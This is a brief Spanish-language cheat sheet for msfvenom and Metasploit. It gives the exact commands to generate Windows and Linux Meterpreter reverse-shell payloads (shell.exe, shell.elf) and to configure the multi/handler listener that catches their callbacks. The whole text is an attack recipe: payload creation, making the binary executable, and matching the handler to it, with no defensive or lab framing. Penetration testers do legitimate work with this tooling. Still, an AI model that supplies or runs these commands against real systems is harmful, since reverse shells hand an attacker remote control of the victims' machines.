Herramienta para generar payloads maliciosos para diferentes sistemas.

• Genera shells reversas  
• Compatible con múltiples formatos  
• Usado junto a Metasploit

## Listar payloads

```
msfvenom --list payloads
```

## Listar formatos

```
msfvenom --list formats
```


## Payload Windows

Genera ejecutable para Windows.

```
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```


## Payload Linux

Genera binario ELF para Linux.

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```

	chmod +x shell.elf

## Handler (Listener)

Escucha la conexión entrante del payload.


```
use exploit/multi/handler
```

	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST IP
	set LPORT PORT


• Asegurar coincidencia entre payload y handler  
• Elegir arquitectura correcta (x86 / x64)